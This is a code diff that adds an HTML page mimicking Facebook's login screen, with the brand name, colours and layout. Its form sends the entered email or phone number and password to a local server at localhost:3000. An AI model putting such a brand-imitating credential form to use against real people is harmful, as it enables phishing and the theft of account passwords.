@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      text-align: center;
+      margin-top: 50px;
+    }
+    .login-container h1 {
+      font-size: 28px;
+      color: #1877f2;
+      margin-bottom: 10px;
+      text-transform: lowercase; /* Convert text to lowercase */
+    }
+    .login-container input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #1877f2;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .login-container button:hover {
+      background-color: #166fe5;
+    }
+    .login-container .signup-link {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .login-container .signup-link a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .login-container .signup-link a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>facebook</h1>
+    <form id="loginForm" action="http://localhost:3000/login" method="POST">
+      <input type="text" name="email_or_phone" placeholder="Email address or phone number" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
+    <div class="signup-link">
+      <p>Don't have an account? <a href="#">Sign up for Facebook</a></p>
+    </div>
+  </div>
+</body>
+</html>
